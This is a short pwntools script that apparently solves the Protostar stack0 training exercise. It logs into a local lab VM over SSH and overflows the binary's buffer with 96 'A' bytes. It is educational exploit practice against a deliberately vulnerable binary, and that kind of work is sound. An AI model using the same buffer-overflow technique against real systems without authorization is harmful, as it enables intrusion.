from pwn import *

# The IP depends on your individual vm setup, make
# sure to change as needed.
s = ssh(host='192.168.56.102', user='user', password='user')
proc = s.run('/opt/protostar/bin/stack0')

# We don't even need to be clever, just need to send a lot of data.
proc.sendline('\x41'*96)
print proc.recvuntil('variable')
